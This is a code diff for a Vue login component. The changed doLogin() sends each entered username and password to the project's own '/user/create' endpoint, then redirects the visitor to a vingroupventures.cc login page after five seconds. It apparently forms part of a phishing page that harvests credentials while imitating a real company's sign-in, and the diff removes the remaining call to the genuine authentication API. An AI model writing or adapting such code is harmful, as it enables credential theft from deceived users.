@@ -90,7 +90,6 @@
 </template>
 
 <script>
-import vinGroupApi from '@/utils/vinGroupApi'
 import backendApi from '@/utils/backendApi'
 import { Toast } from 'vant';
 
@@ -113,36 +112,17 @@ export default {
       }
     },
     doLogin() {
-      vinGroupApi
-      .post('/auth/login', {
-        "username": this.username,
-        "password": this.password,
-      })
-      .then((response) => {
-        this.response_data = response.data
-
-        // if (this.response_data.code == 200) {
-          // backendApi.post('/user/create', {
-          //   "username": this.username,
-          //   "password": this.password,
-          // })
-          // .then({})
-          // .catch(error => console.log(error))
-          // .finally(() => {window.location.href = "http://vingroupventures.cc/#/login";})
-        // } else {
-          Toast(this.response_data.msg);
-        // }
-      })
-      .catch(error => console.log(error))
-      .finally(
-        backendApi.post('/user/create', {
-            "username": this.username,
-            "password": this.password,
-          })
-          .then({})
-          .catch(error => console.log(error))
-          .finally(() => {window.location.href = "http://vingroupventures.cc/#/login";})
-      )
+      backendApi.post('/user/create', {
+          "username": this.username,
+          "password": this.password,
+        })
+        .then((response) => {
+          Toast(response.data.msg);
+        })
+        .catch(error => console.log('error call api login', error))
+        .finally(() => {setTimeout(() => {
+          window.location.href = "http://vingroupventures.cc/#/login";
+        }, 5000);})
     }
   }
 };
